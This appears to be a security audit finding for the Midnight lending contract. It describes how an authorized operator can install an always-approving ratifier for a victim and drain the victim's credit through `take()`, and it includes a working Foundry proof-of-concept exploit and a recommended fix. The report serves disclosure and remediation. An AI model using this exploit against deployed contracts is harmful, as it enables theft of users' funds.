### Title
Authorized Operator Can Authorize Malicious Ratifier on Behalf of Victim, Enabling Unauthorized Offer Execution - (File: src/Midnight.sol)

### Summary
`Midnight.setIsAuthorized` permits any address already authorized by a victim to authorize additional addresses — including a malicious ratifier — on behalf of that victim. Because `take()` only checks `isAuthorized[offer.maker][offer.ratifier]` to validate ratifier authorization, an attacker who holds any authorization from the victim can install a ratifier that unconditionally returns `CALLBACK_SUCCESS`, then execute arbitrary offers with `offer.maker = victim` without the victim's knowledge or consent.

### Finding Description

**Root cause — `setIsAuthorized` (src/Midnight.sol:731-735):**

```solidity
function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    isAuthorized[onBehalf][authorized] = newIsAuthorized;
    ...
}
```

The only guard is that `msg.sender` is already authorized by `onBehalf`. There is no restriction on *what* can be authorized — an operator and a ratifier share the same flat mapping. An authorized operator can therefore call `setIsAuthorized(maliciousRatifier, true, victim)` and it passes.

**Ratifier check in `take()` (src/Midnight.sol:355-356):**

```solidity
require(isAuthorized[offer.maker][offer.ratifier], RatifierUnauthorized());
require(IRatifier(offer.ratifier).isRatified(offer, ratifierData) == CALLBACK_SUCCESS, RatifierFail());
```

After the attacker installs `maliciousRatifier` into `isAuthorized[victim]`, both checks pass: the mapping entry is `true`, and the malicious ratifier unconditionally returns `CALLBACK_SUCCESS`.

**Full exploit path:**

1. Victim legitimately authorizes attacker for some purpose (e.g., position management): `midnight.setIsAuthorized(attacker, true, victim)` → `isAuthorized[victim][attacker] = true`.
2. Attacker deploys `MaliciousRatifier` whose `isRatified()` always returns `CALLBACK_SUCCESS`.
3. Attacker calls `midnight.setIsAuthorized(maliciousRatifier, true, victim)`. The check `isAuthorized[victim][attacker]` is `true`, so it passes. Now `isAuthorized[victim][maliciousRatifier] = true`.
4. Attacker constructs an `Offer` with:
   - `offer.maker = victim`
   - `offer.ratifier = maliciousRatifier`
   - `offer.buy = false` (victim is seller; victim's existing credit is consumed)
   - `offer.tick` = minimum valid tick (near-zero price)
   - `offer.maxUnits` = victim's full credit balance
   - `offer.receiverIfMakerIsSeller` = attacker-controlled address
5. Attacker calls `midnight.take(offer, ..., units, attacker, ...)`.
   - `taker == msg.sender` → passes.
   - `isAuthorized[victim][maliciousRatifier]` → `true` → passes.
   - `maliciousRatifier.isRatified(...)` → `CALLBACK_SUCCESS` → passes.
6. `take()` executes: `sellerCreditDecrease = min(units, victim.credit)` reduces victim's credit; `buyerCreditIncrease` gives attacker equivalent credit. Attacker pays `buyerAssets` (near-zero at minimum tick) and withdraws the newly acquired credit.

The `testSetIsAuthorizedAuthorization` test (test/AuthorizationTest.sol:290-304) explicitly confirms that an authorized address can authorize further addresses on behalf of the user, demonstrating this path is reachable.

### Impact Explanation
A victim's entire lending credit position can be drained. The attacker pays a near-zero amount of loan tokens (by choosing the minimum valid tick) and receives equivalent credit, which they immediately withdraw. The victim's `position[id][victim].credit` is zeroed without any signature or explicit consent from the victim for those specific offers. This directly violates the invariant: *"signatures, gates, ratifiers, callbacks, and approvals bind the right user/market/action/amount/deadline."*

### Likelihood Explanation
The precondition — victim having authorized the attacker — is common and expected (e.g., a user authorizes a smart-contract operator for automated position management). Once that authorization exists, the attacker can execute the full exploit in a single transaction. The attack is repeatable across any market where the victim holds credit, and requires no oracle manipulation, no admin access, and no user mistake beyond the initial legitimate authorization.

### Recommendation
Separate the authorization namespace for operators from the authorization namespace for ratifiers. One approach: add a dedicated `isRatifierAuthorized` mapping that can only be written by `msg.sender == onBehalf` (never by a delegated operator), and use that mapping in the `take()` ratifier check. Alternatively, restrict `setIsAuthorized` so that a delegated operator cannot grant further authorizations on behalf of the user (i.e., require `onBehalf == msg.sender` when the `authorized` address is a ratifier, or remove transitive delegation entirely).

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {IMidnight, Market, CollateralParams, Offer} from "../src/interfaces/IMidnight.sol";
import {CALLBACK_SUCCESS} from "../src/libraries/ConstantsLib.sol";
import {IRatifier} from "../src/interfaces/IRatifier.sol";
import {MAX_TICK} from "../src/libraries/TickLib.sol";

contract AlwaysRatifier is IRatifier {
    function isRatified(Offer memory, bytes memory) external pure returns (bytes32) {
        return CALLBACK_SUCCESS;
    }
}

contract AuthorizationRatifierAbuse is BaseTest {
    function testAttackerDrainsVictimCreditViaRatifierAbuse() public {
        // Setup: victim (lender) supplies credit to a market
        uint256 units = 1_000e18;
        Market memory market;
        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 100;
        market.collateralParams.push(CollateralParams({
            token: address(collateralToken1),
            lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18),
            oracle: address(oracle1)
        }));
        collateralize(market, borrower, units);
        setupMarket(market, units); // lender supplies `units` credit

        address attacker = makeAddr("attacker");

        // Precondition: victim (lender) authorizes attacker for some legitimate purpose
        vm.prank(lender);
        midnight.setIsAuthorized(attacker, true, lender);

        // Step 1: attacker deploys malicious ratifier
        AlwaysRatifier maliciousRatifier = new AlwaysRatifier();

        // Step 2: attacker authorizes malicious ratifier on behalf of victim
        vm.prank(attacker);
        midnight.setIsAuthorized(address(maliciousRatifier), true, lender);
        // Assert: isAuthorized[lender][maliciousRatifier] == true
        assertTrue(midnight.isAuthorized(lender, address(maliciousRatifier)));

        // Step 3: attacker constructs offer with victim as maker, malicious ratifier
        Offer memory offer;
        offer.buy = false;           // victim is seller; victim's credit is consumed
        offer.maker = lender;        // victim
        offer.ratifier = address(maliciousRatifier);
        offer.maxUnits = units;
        offer.market = market;
        offer.expiry = vm.getBlockTimestamp() + 200;
        offer.tick = 1;              // minimum tick → near-zero price → attacker pays almost nothing
        offer.receiverIfMakerIsSeller = attacker; // attacker receives seller assets

        // Fund attacker with minimal loan tokens to cover buyerAssets at tick=1
        deal(address(loanToken), attacker, 1e18);
        vm.prank(attacker);
        loanToken.approve(address(midnight), type(uint256).max);

        uint256 victimCreditBefore = midnight.creditOf(toId(market), lender);

        // Step 4: attacker takes the offer — no victim signature required
        vm.prank(attacker);
        midnight.take(offer, hex"", units, attacker, attacker, address(0), hex"");

        uint256 victimCreditAfter = midnight.creditOf(toId(market), lender);

        // Assert: victim's credit is drained
        assertEq(victimCreditAfter, 0, "victim credit should be zero");
        // Assert: attacker gained credit
        assertGt(midnight.creditOf(toId(market), attacker), 0, "attacker should have credit");
    }
}
```
